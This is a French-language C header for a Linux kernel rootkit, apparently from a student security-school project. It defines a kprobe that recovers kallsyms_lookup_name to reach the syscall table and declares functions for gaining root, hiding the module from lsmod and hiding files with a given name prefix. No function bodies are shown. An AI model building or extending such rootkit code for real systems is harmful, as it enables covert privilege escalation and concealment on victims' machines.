#ifndef ROOTKIT_HELPER_H
#define ROOTKIT_HELPER_H

#include <linux/module.h>
#include <linux/version.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/dirent.h>

#define FICHIER_QUI_COMMENCE_PAR_ecole2600groupe6 "ecole2600groupe6"


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define UTILISER_KPROBE 1
#include <linux/kprobes.h>
/* Structure kprobe utilisée pour récupérer l'adresse de kallsyms_lookup_name() si la version du kernel Linux est supérieure à 5.7 */
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

/*  Retourne l'adresse de la fonction kallsyms_lookup_name(), utile pour récupérer la table des syscalls.
    Dans le cas où la version du kernel est inférieure à 5.7, un bruteforce + comparaison de chaîne de caractères est nécessaire.
*/
long unsigned int recuperer_adresse_kallsyms_lookup_name(void);

/*  Permet d'avoir les droits root. */
void avoir_droits_root(void);

/*  Permet de cacher le module (n'apparaît pas avec lsmod). */
void cacher_le_module_de_lsmod(void);

#endif // ROOTKIT_HELPER_H
